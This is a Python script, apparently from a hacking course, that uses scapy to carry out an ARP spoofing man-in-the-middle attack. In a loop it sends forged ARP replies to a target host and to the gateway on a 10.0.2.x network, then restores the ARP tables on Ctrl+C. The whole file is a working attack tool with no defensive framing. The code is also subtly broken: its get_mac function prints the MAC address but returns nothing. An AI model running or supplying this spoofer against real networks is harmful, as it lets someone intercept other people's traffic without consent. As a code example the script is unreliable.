#!/usr/bin/env python
# import sys --> For python2.7 and below
import time
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    print(answered_list[0][1].hwsrc)

def spoof(target_ip, spoof_ip):
# here in ARP object the pdst argument refers to target ip which can be found through thr network scanner we built
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, src_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof("10.0.2.7","10.0.2.1")
        spoof("10.0.2.1","10.0.2.7")
        sent_packets_count = sent_packets_count + 2
        # For python2.7 & below
        # print("\r[+] Packets sent: "+ str(sent_packets_count)),
        # sys.stdout.flush()

        # For python3
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ..... Resetting ARP tables.... Please wiait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)